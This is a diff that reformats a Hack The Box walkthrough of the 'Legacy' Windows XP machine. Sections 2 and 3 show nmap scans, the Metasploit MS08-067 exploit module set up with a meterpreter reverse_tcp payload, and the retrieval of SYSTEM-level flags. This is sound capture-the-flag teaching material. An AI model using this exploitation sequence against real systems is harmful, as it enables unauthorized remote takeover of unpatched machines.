@@ -1,15 +1,16 @@
-# 📜 Legacy: Smashing Windows XP with MS08-067 & Instant Root 💥
+# Legacy
 
 One command. Zero passwords. Total control. 💻Discover why unpatched services are digital death sentences 💀 (and how to fix them).
 
----
+***
 
 ### 📜 Legacy: Windows SMB Exploitation
 
 ![](https://cdn-images-1.medium.com/max/800/1*PLWjIRHJD6Rk42pZ-0Pj4A.png)
-<figcaption>Image created by Nicholas Mullenski (Gemini)</figcaption>
 
-**Target:** Legacy (Hack The Box) **OS:** Windows XP **Difficulty:** Easy **Attack Vectors:** SMB Vulnerability (MS08–067) -\> Remote Code Execution (CVE-2008–4250).
+Image created by Nicholas Mullenski (Gemini)
+
+**Target:** Legacy (Hack The Box) **OS:** Windows XP **Difficulty:** Easy **Attack Vectors:** SMB Vulnerability (MS08–067) -> Remote Code Execution (CVE-2008–4250).
 
 ### Executive Summary
 
@@ -17,7 +18,7 @@ This assessment targeted “Legacy,” a retired Windows XP machine acting as a 
 
 Unlike modern systems that require complex privilege escalation chains, this specific vulnerability granted immediate `SYSTEM` (Root) access upon exploitation, allowing for the retrieval of both user and root flags in a single strike.
 
-### 1.0 Initial Foothold
+### 1.0 Initial Foothold
 
 #### 1.1 Reconnaissance & Enumeration
 
@@ -56,22 +57,22 @@ Host script results:
 
 **1.1.2 Nmap Scan Analysis:**
 
-- <span id="afa6">The scan identified three open ports on the target **`10.10.10.4`**: **135 (MSRPC)**, **139 (NetBIOS-SSN)**, and **445 (Microsoft-DS)**.</span>
-- <span id="713a">The Nmap scripting engine (**`smb-os-discovery`**) provided critical fingerprinting data, explicitly identifying the operating system as **Windows XP** and the computer name as **LEGACY**. The scan also noted that message signing is disabled, which is a default but insecure configuration.</span>
-- <span id="3774">Most importantly, the presence of Windows XP combined with open SMB ports (445) is a significant indicator of historical vulnerabilities. Windows XP has been End-of-Life (EOL) since 2014, meaning it is susceptible to critical remote code execution exploits that target the SMBv1 protocol, such as MS08–067 (NetAPI) or MS17–010 (EternalBlue).</span>
+* The scan identified three open ports on the target **`10.10.10.4`**: **135 (MSRPC)**, **139 (NetBIOS-SSN)**, and **445 (Microsoft-DS)**.
+* The Nmap scripting engine (**`smb-os-discovery`**) provided critical fingerprinting data, explicitly identifying the operating system as **Windows XP** and the computer name as **LEGACY**. The scan also noted that message signing is disabled, which is a default but insecure configuration.
+* Most importantly, the presence of Windows XP combined with open SMB ports (445) is a significant indicator of historical vulnerabilities. Windows XP has been End-of-Life (EOL) since 2014, meaning it is susceptible to critical remote code execution exploits that target the SMBv1 protocol, such as MS08–067 (NetAPI) or MS17–010 (EternalBlue).
 
 **1.1.3 Key Findings:**
 
-- <span id="7955">**Open Ports:** 139 & 445 (SMB), 135 (RPC).</span>
-- <span id="a49b">**OS Version:** Windows XP SP3 (English).</span>
-- <span id="d7ef">**Host Name:** LEGACY.</span>
-- <span id="561c">**Vulnerability Assessment:** The target is running a deprecated OS with exposed file-sharing services. This represents a critical risk for buffer overflow attacks against the Server Service.</span>
+* **Open Ports:** 139 & 445 (SMB), 135 (RPC).
+* **OS Version:** Windows XP SP3 (English).
+* **Host Name:** LEGACY.
+* **Vulnerability Assessment:** The target is running a deprecated OS with exposed file-sharing services. This represents a critical risk for buffer overflow attacks against the Server Service.
 
 #### 1.2 Vulnerability Assessment
 
 **1.2.1 Script Scanning:**
 
-- <span id="8360">To confirm the hypothesis that the legacy operating system contains unpatched SMB vulnerabilities, we utilized Nmap’s targeted vulnerability scanning scripts against ports 139 and 445.</span>
+* To confirm the hypothesis that the legacy operating system contains unpatched SMB vulnerabilities, we utilized Nmap’s targeted vulnerability scanning scripts against ports 139 and 445.
 
 **Command:**
 
@@ -81,7 +82,7 @@ nmap --script smb-vuln* -p 139,445 10.10.10.4
 
 **1.2.2 Vulnerability Identification (CVE-2008–4250)**
 
-- <span id="452c">The script output definitively identified the target as vulnerable to **MS08–067 (NetAPI)**.</span>
+* The script output definitively identified the target as vulnerable to **MS08–067 (NetAPI)**.
 
 **Output Analysis:**
 
@@ -99,18 +100,18 @@ Host script results:
 
 #### 1.3 Technical Explanation:
 
-**Vulnerability:** *Microsoft Server Service RPC Handling Remote Code Execution* **CVE:** *CVE-2008–4250*
+**Vulnerability:** _Microsoft Server Service RPC Handling Remote Code Execution_ **CVE:** _CVE-2008–4250_
 
-- <span id="5e6b">This vulnerability is a classic **stack-based buffer overflow** located in the **`netapi32.dll`** library.</span>
-- <span id="da6e">The flaw occurs because the Server Service fails to properly check the bounds of a path string sent via a crafted RPC request. By sending a malformed path that exceeds the buffer size, we can overwrite the **Return Address** on the stack. This redirects the CPU’s execution flow to our own malicious code (shellcode) instead of returning to the normal program function. Since the Server Service runs as **`SYSTEM`**, our code executes with the highest possible privileges.</span>
+* This vulnerability is a classic **stack-based buffer overflow** located in the **`netapi32.dll`** library.
+* The flaw occurs because the Server Service fails to properly check the bounds of a path string sent via a crafted RPC request. By sending a malformed path that exceeds the buffer size, we can overwrite the **Return Address** on the stack. This redirects the CPU’s execution flow to our own malicious code (shellcode) instead of returning to the normal program function. Since the Server Service runs as **`SYSTEM`**, our code executes with the highest possible privileges.
 
-### 2.0 Initial Shell
+### 2.0 Initial Shell
 
-#### 2.1 Payload Delivery
+#### 2.1 Payload Delivery
 
 **2.1.1 Metasploit Configuration**
 
-- <span id="2eb8">Given the complexity of the MS08–067 stack overflow (which requires precise memory offsets for specific Windows XP service pack languages), we utilized the Metasploit Framework to ensure stability.</span>
+* Given the complexity of the MS08–067 stack overflow (which requires precise memory offsets for specific Windows XP service pack languages), we utilized the Metasploit Framework to ensure stability.
 
 **Command:**
 
@@ -119,7 +120,7 @@ msfconsole -q
 use exploit/windows/smb/ms08_067_netapi
 ```
 
-- <span id="52c7">**Configuration:** We targeted the remote machine (**`RHOSTS`**) and configured our local listener (**`LHOST`**) to capture the reverse connection.</span>
+* **Configuration:** We targeted the remote machine (**`RHOSTS`**) and configured our local listener (**`LHOST`**) to capture the reverse connection.
 
 ```
 msf6 > set RHOSTS 10.10.10.4
@@ -131,7 +132,7 @@ msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
 
 **2.2.1 Exploit Execution**
 
-- <span id="28be">With the payload configured, we executed the exploit against the Server Service.</span>
+* With the payload configured, we executed the exploit against the Server Service.
 
 ```
 msf6 > run
@@ -144,7 +145,7 @@ msf6 > run
 
 **2.2.2 Identity Verification**
 
-- <span id="3f2f">Upon receiving the session, we verified our privilege level. Because the vulnerable service (**`lanmanserver`**) runs with System-level permissions, the exploit grants immediate administrative control without needing further escalation.</span>
+* Upon receiving the session, we verified our privilege level. Because the vulnerable service (**`lanmanserver`**) runs with System-level permissions, the exploit grants immediate administrative control without needing further escalation.
 
 ```
 meterpreter > getuid
@@ -161,7 +162,7 @@ Server username: NT AUTHORITY\SYSTEM
 
 **3.1.1 System Confirmation**
 
-- <span id="e512">Upon establishing the session, we confirmed that MS08–067 grants immediate System-level access. Unlike modern exploits that often require a secondary privilege escalation phase (e.g., from **`www-data`** to **`root`**), this vulnerability compromises the core service itself.</span>
+* Upon establishing the session, we confirmed that MS08–067 grants immediate System-level access. Unlike modern exploits that often require a secondary privilege escalation phase (e.g., from **`www-data`** to **`root`**), this vulnerability compromises the core service itself.
 
 **Command:**
 
@@ -179,11 +180,11 @@ System Language : en_US
 Meterpreter     : x86/windows
 ```
 
-#### 3.2 Flag Capture
+#### 3.2 Flag Capture
 
 **3.2.1 Retrieving User Flag**
 
-- <span id="f89a">We navigated to the user profile directory. On Windows XP, user profiles are located in **`C:\Documents and Settings\`** rather than **`C:\Users\`**.</span>
+* We navigated to the user profile directory. On Windows XP, user profiles are located in **`C:\Documents and Settings\`** rather than **`C:\Users\`**.
 
 **Command:**
 
@@ -195,7 +196,7 @@ e69af0e4f443de7e36876fda4ec7644f
 
 **3.2.2 Retrieving Root Flag**
 
-- <span id="d2a7">With full administrative access, we retrieved the final proof of compromise from the Administrator’s desktop.</span>
+* With full administrative access, we retrieved the final proof of compromise from the Administrator’s desktop.
 
 **Command:**
 
@@ -206,9 +207,10 @@ type "C:\Documents and Settings\Administrator\Desktop\root.txt"
 ```
 
 ![](https://cdn-images-1.medium.com/max/800/1*pPPGEJELAlkPqCuI7eGtPA.png)
-<figcaption>Image created by Nicholas Mullenski (Gemini)</figcaption>
 
-### 4.0 Final Thoughts: The Red Team Mandate
+Image created by Nicholas Mullenski (Gemini)
+
+### 4.0 Final Thoughts: The Red Team Mandate
 
 Legacy serves as a reminder of the “Dark Ages” of internet security. The MS08–067 vulnerability was a wormable exploit that allowed malware like Conficker to spread globally, infecting millions of computers without any user interaction.
 
@@ -222,25 +224,25 @@ While Windows XP is retired, the lesson remains relevant: **Unpatched services a
 
 **How it ties into the machine:**
 
-- <span id="730e">**The Name:** The machine is literally named “Legacy,” defining something old, handed down, and often outdated.</span>
-- <span id="321a">**The Obsolescence:** Just as the Old Covenant became obsolete because it could not offer perfection or true security, Windows XP and the NetAPI protocol became obsolete because they could not withstand the attacks of the modern world.</span>
-- <span id="18dc">**The Application:** We cannot rely on “Legacy” systems — whether digital or spiritual — to protect us today. We must upgrade to the New: a patched system for our networks, and a new heart for our lives. Holding onto the obsolete only guarantees compromise.</span>
+* **The Name:** The machine is literally named “Legacy,” defining something old, handed down, and often outdated.
+* **The Obsolescence:** Just as the Old Covenant became obsolete because it could not offer perfection or true security, Windows XP and the NetAPI protocol became obsolete because they could not withstand the attacks of the modern world.
+* **The Application:** We cannot rely on “Legacy” systems — whether digital or spiritual — to protect us today. We must upgrade to the New: a patched system for our networks, and a new heart for our lives. Holding onto the obsolete only guarantees compromise.
 
-### 🚀 Join the Mission
+### 🚀 Join the Mission
 
 I don’t want to do this alone. I want to build a community of people who are hungry to learn, build, and break things (ethically). I am constantly looking for the next challenge.
 
-- <span id="7935">Is there a specific tool you wish existed?</span>
-- <span id="47ec">Is there a hacking concept you want me to learn and explain?</span>
-- <span id="195d">Do you have a “brick wall” you’re hitting in your own research?</span>
+* Is there a specific tool you wish existed?
+* Is there a hacking concept you want me to learn and explain?
+* Do you have a “brick wall” you’re hitting in your own research?
 
 Jump into the server, drop a message, and tell me what I should build or learn next. Let’s sharpen each other.
 
-<a href="https://discord.gg/8buAHtm2fK" class="markup--anchor markup--mixtapeEmbed-anchor" data-href="https://discord.gg/8buAHtm2fK" title="https://discord.gg/8buAHtm2fK"><strong>Join the Iron-Breach Discord Server!</strong><br />
-<em>An advanced study group for Offensive Security professionals and students. We specialize in Red Teaming simulation…</em>discord.gg</a><a href="https://discord.gg/8buAHtm2fK" class="js-mixtapeImage mixtapeImage mixtapeImage--empty u-ignoreBlock" data-media-id="9784a322b4c4322c092dbd39583df8bb"></a>
+[**Join the Iron-Breach Discord Server!**\
+_&#x41;n advanced study group for Offensive Security professionals and students. We specialize in Red Teaming simulation…_&#x64;iscord.gg](https://discord.gg/8buAHtm2fK)
 
-By <a href="https://medium.com/@nicholasmullenski" class="p-author h-card">Nicholas Mullenski</a> on [January 5, 2026](https://medium.com/p/5f12678846bd).
+By [Nicholas Mullenski](https://medium.com/@nicholasmullenski) on [January 5, 2026](https://medium.com/p/5f12678846bd).
 
-<a href="https://medium.com/@nicholasmullenski/legacy-smashing-windows-xp-with-ms08-067-instant-root-5f12678846bd" class="p-canonical">Canonical link</a>
+[Canonical link](https://medium.com/@nicholasmullenski/legacy-smashing-windows-xp-with-ms08-067-instant-root-5f12678846bd)
 
 Exported from [Medium](https://medium.com) on September 1, 2026.
